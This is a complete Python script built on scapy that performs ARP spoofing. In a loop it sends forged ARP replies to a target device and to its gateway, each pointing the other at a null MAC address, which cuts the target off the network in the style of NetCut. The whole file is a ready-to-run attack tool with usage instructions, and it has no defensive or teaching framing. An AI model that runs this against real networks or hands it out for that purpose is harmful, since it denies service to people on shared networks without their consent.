#!/usr/bin/env python3
"""Send periodic ARP replies to cut a device from the network (NetCut-style)."""

import sys
import time

try:
    from scapy.all import ARP, Ether, conf, getmacbyip, sendp
except ImportError:
    print("Install scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)


def normalize_mac(mac: str) -> str:
    return mac.replace("-", ":").lower()


def resolve_mac(ip: str, fallback: str = "ff:ff:ff:ff:ff:ff") -> str:
    try:
        mac = getmacbyip(ip)
        if mac:
            return normalize_mac(mac)
    except Exception:
        pass
    return fallback


def main():
    if len(sys.argv) < 4:
        print("Usage: arp_spoof.py <target_ip> <target_mac> <gateway_ip>", file=sys.stderr)
        sys.exit(1)

    target_ip = sys.argv[1]
    target_mac = normalize_mac(sys.argv[2])
    gateway_ip = sys.argv[3]
    blackhole_mac = "00:00:00:00:00:00"

    conf.verb = 0

    print(f"Cutting {target_ip} ({target_mac}) via gateway {gateway_ip}", flush=True)

    while True:
        gateway_mac = resolve_mac(gateway_ip, "ff:ff:ff:ff:ff:ff")

        # Tell the victim the router lives at an invalid MAC.
        sendp(
            Ether(dst=target_mac)
            / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=blackhole_mac),
            verbose=0,
        )

        # Tell the router the victim lives at an invalid MAC.
        sendp(
            Ether(dst=gateway_mac)
            / ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=blackhole_mac,
            ),
            verbose=0,
        )

        time.sleep(2)


if __name__ == "__main__":
    main()
